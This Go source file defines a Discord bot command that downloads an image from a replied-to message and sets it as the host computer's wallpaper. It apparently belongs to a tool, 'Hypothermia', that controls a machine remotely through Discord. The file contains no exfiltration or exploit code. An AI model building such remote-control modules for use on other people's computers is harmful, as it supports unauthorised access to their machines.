package commands

import (
	"path/filepath"
	"strings"

	"Hypothermia/src/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	wpNoPicError string = "🟥 You need reply to an image."
	wpSuccess    string = "🟩 Successfully set wallpaper."
)

func (*WallpaperCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if m.MessageReference == nil {
		s.ChannelMessageSendReply(m.ChannelID, wpNoPicError, m.Reference())
		return
	}

	var imgURL string
	msg, _ := s.ChannelMessage(m.MessageReference.ChannelID, m.MessageReference.MessageID)

	for _, attachment := range msg.Attachments {
		ext := strings.ToLower(filepath.Ext(attachment.Filename))

		if ext == ".jpg" || ext == ".jpeg" || ext == ".png" || ext == ".gif" || ext == ".bmp" {
			imgURL = attachment.URL
			break
		}
	}

	if imgURL == "" {
		s.ChannelMessageSendReply(m.ChannelID, wpNoPicError, m.Reference())
		return
	}

	path, ret := utils.DonwloadFile(imgURL, "")
	if ret != "" {
		s.ChannelMessageSendReply(m.ChannelID, ret, m.Reference())
		return
	}

	ret = utils.SetWallpaper(path)
	if ret != "" {
		s.ChannelMessageSendReply(m.ChannelID, ret, m.Reference())
		return
	}

	s.ChannelMessageSendReply(m.ChannelID, wpSuccess, m.Reference())
}

func (*WallpaperCommand) Name() string {
	return "wallpaper"
}

func (*WallpaperCommand) Info() string {
	return "sets the users wallpaper"
}

type WallpaperCommand struct{}
